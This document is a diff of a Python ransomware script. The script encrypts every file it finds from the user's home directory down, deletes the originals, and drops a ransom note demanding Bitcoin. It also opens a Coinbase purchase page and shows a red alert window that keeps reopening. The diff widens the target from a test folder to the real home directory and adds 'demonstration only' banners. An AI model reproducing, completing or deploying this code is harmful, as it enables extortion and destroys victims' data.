@@ -6,10 +6,13 @@ from Crypto import Random
 from os.path import expanduser
 from urllib2 import urlopen
 
+## FOR DEMONSTRATION PURPOSES ONLY##
+## FOR DEMONSTRATION PURPOSES ONLY##
+## FOR DEMONSTRATION PURPOSES ONLY##
+## FOR DEMONSTRATION PURPOSES ONLY##
 
 #significant help on getting AES encryption to work from
 #https://github.com/the-javapocalypse/Python-File-Encryptor/blob/master/script.py
-
 def pad(s):
     return s + b"\0" * (AES.block_size - len(s) % AES.block_size)
 
@@ -17,6 +20,7 @@ def encrypt(message, key, key_size=256):
     message = pad(message)
     iv = Random.new().read(AES.block_size)
     cipher = AES.new(key, AES.MODE_CBC, iv)
+    
     return iv + cipher.encrypt(message)
 
 def encrypt_file(key, file_name):
@@ -25,13 +29,15 @@ def encrypt_file(key, file_name):
     enc = encrypt(plaintext, key)
     with open(file_name + ".enc", 'wb') as fo:
         fo.write(str(enc))
+        
     os.remove(file_name)
 
 def decrypt(ciphertext, key):
-        iv = ciphertext[:AES.block_size]
-        cipher = AES.new(key, AES.MODE_CBC, iv)
-        plaintext = cipher.decrypt(ciphertext[AES.block_size:])
-        return plaintext.rstrip(b"\0")
+    iv = ciphertext[:AES.block_size]
+    cipher = AES.new(key, AES.MODE_CBC, iv)
+    plaintext = cipher.decrypt(ciphertext[AES.block_size:])
+    
+    return plaintext.rstrip(b"\0")
 
 def decrypt_file(key, file_name):
     with open(file_name, 'rb') as fo:
@@ -39,19 +45,20 @@ def decrypt_file(key, file_name):
     dec = decrypt(ciphertext, key)
     with open(file_name[:-4], 'wb') as fo:
         fo.write(dec)
+        
     os.remove(file_name)
 
 #traversing the file system to encrypt files
 def traverse_files(nwd, aes_key, depth):
     # get list of files and directories in current directory
-    search_dir = nwd + "/*"
+    search_dir = os.path.join(nwd, "*")
     files = glob.glob(search_dir)
     # want to make sure there are files to encrypt or directories to search
     while files:
         for path in files:
             req1 = 'Home' in os.path.basename(os.path.normpath(path))
             req2 = 'home' in os.path.basename(os.path.normpath(path))
-            req3 = 'INFO' in os.path.basename(os.path.normpath(path))
+            req3 = 'RANSOM_INFO' in os.path.basename(os.path.normpath(path))
 
             if not os.path.isdir(path):
                 encrypt_file(aes_key, path)
@@ -64,15 +71,16 @@ def traverse_files(nwd, aes_key, depth):
 
 def display_note(directory, loop):
 
-    note = """ Q: What has happened to my computer?
+    note = """ Q: What's happened to my computer?
 
-    All of your files have been encrypted. Your decyption key is in the 'RANSOM_INFO'
-    folder on your desktop. We suggest you don't tamper with it.
+    All of your files have been encrypted. Your decryption key is in the 'RANSOM_INFO'
+    folder on your desktop, but it is encrypted. We suggest you don't tamper with it,
+    otherwise you won't be able to recover your files.
 
 
-Q: Can I recover my files?
+Q: How can I recover my files?
 
-    Yes you can. Just send $100 of Bitcoin to this Bitcoin address:
+    Just send $100 of Bitcoin to this Bitcoin address:
 
                   1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa
 
@@ -85,22 +93,27 @@ Q: Can I recover my files?
     """
 
     f = open (os.path.join(directory, "RANSOM_NOTE.txt"), 'w')
-    f.write(note) #write ciphertext to file
+    f.write(note) #write RANSOM_NOTE to file
     f.close()
     
-    if(loop == 0) webbrowser.open('https://www.coinbase.com/buy-bitcoin')
+    #automatically open up Coinbase
+    webbrowser.open('https://www.coinbase.com/buy-bitcoin')
 
+    #ransom note window
     master = Tk()
     master.title('RANSOMWARE ATTACK')
+    master.lift()
     msg = Message(master, text = note)
     msg.config(bg='red', font=('times', 24, 'italic'))
     msg.pack()
     mainloop()
-    webbrowser.open('https://www.coinbase.com/buy-bitcoin')
-    display_note(directory)
+    
+    #webbrowser.open('https://www.coinbase.com/buy-bitcoin')
+    
+    display_note(directory, loop + 1)
 
 def main():
-    #### PUBLIC ENCRYPTION KEY WILL BE ADDED HERE ####
+    #### UNIQUE PUBLIC ENCRYPTION KEY WILL BE ADDED HERE ####
 
 
     rsa_key = RSA.importKey(public_key)
@@ -108,14 +121,16 @@ def main():
 
     #generate a random AES key, pass it to the traverse function which will
     #use it for encrypting individual files
-    #represented in bytes 16 bytes = 128 bits
+    #represented in bytes 32 bytes = 256 bits
     aes_key = os.urandom(32)
 
     #start from the home directory, pass it to the traverse function
+    #the starting directory could easily be changed
     home = os.environ['HOME']
-    cwd = os.path.join(home, 'TestFiles')
-    print(cwd + "\n")
-    traverse_files(cwd, aes_key, 0)
+    
+    #print(home + "\n")
+    
+    traverse_files(home, aes_key, 0)
 
     encrypted_key = pub_key.encrypt(aes_key, 32)
 
@@ -131,3 +146,8 @@ def main():
 
 if __name__ == "__main__":
     main()
+    
+## FOR DEMONSTRATION PURPOSES ONLY##
+## FOR DEMONSTRATION PURPOSES ONLY##
+## FOR DEMONSTRATION PURPOSES ONLY##
+## FOR DEMONSTRATION PURPOSES ONLY##
